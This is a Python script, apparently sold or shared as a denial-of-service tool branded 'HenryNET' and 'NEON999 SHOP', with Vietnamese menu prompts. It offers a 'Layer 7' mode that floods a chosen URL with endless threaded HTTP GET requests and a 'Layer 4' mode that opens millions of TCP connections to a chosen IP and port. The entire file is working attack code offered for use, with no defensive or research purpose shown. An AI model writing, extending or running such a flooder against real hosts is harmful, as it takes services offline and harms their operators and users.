import httpx
import os
import socket
import threading
import time
from datetime import datetime
import itertools

def led_print(text):
    colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']
    for color in itertools.cycle(colors):
        print(f"\033[1;{colors.index(color) + 31}m{text}\033[0m")
        time.sleep(0.1)
        break

def gui_packer(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, int(port)))
        request = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n"
        sock.send(request.encode())
        sock.close()
    except:
        pass

def worker(ip, port, packer):
    for i in range(packer):
        gui_packer(ip, port)
        if i % 100 == 0:
            led_print(f"- HenryNET | Layer 4 Attack To [{ip}:{port}] | Packer: [{i}/s]")

def ddos_layer4(ip, port, luong_ddos, packer):
    cac_luong = []
    for _ in range(int(luong_ddos)):
        t = threading.Thread(target=worker, args=(ip, port, packer))
        cac_luong.append(t)
        t.start()
    for t in cac_luong:
        t.join()

def layer7_worker(url):
    client = httpx.Client()
    count = 0
    while True:
        try:
            response = client.get(url)
            count += 1
            if count % 1000000 == 0:
                led_print(f"- HenryNET | Layer 7 Attack To [{url}] | Requests Sent: [{count}]")
        except:
            pass

def ddos_layer7(url, luong_ddos):
    yeucau_ddos = 1000000000
    cac_luong = []
    for _ in range(int(luong_ddos)):
        t = threading.Thread(target=layer7_worker, args=(url,))
        cac_luong.append(t)
        t.start()
    for t in cac_luong:
        t.join()

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""
 
─────────────────────────────────────────────────────────────
─████████████───████████████───██████████████─██████████████─
─██▒▒▒▒▒▒▒▒████─██▒▒▒▒▒▒▒▒████─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─
─██▒▒████▒▒▒▒██─██▒▒████▒▒▒▒██─██▒▒██████▒▒██─██▒▒██████████─
─██▒▒██──██▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██─██▒▒██─────────
─██▒▒██──██▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██─██▒▒██████████─
─██▒▒██──██▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒▒▒██─
─██▒▒██──██▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██─██████████▒▒██─
─██▒▒██──██▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██─────────██▒▒██─
─██▒▒████▒▒▒▒██─██▒▒████▒▒▒▒██─██▒▒██████▒▒██─██████████▒▒██─
─██▒▒▒▒▒▒▒▒████─██▒▒▒▒▒▒▒▒████─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─
─████████████───████████████───██████████████─██████████████─
─────────────────────────────────────────────────────────────
    [#] By NEON999 SHOP
    [0] Cancel
    [1] DDOS Layer7
    [2] DDOS Layer4
""")
    while True:
        lua_chon = int(input("[Nhập Lựa Chọn]~$ "))
        if lua_chon == 0:
            print("Gut Bye. Cảm Ơn Bạn")
            break

        if lua_chon == 1:
            url = input('Nhập URL: ')
            luong_ddos = input('Nhập Luồng Tấn Công: ')
            ddos_layer7(url, luong_ddos)

        elif lua_chon == 2:
            ip = input('Nhập IP: ')
            port = input('Nhập PORT: ')
            luong_ddos = input('Nhập Luồng Tấn Công: ')
            packer = 7500000
            ddos_layer4(ip, port, luong_ddos, packer)

        else:
            print("Sai Lựa Chọn !")
            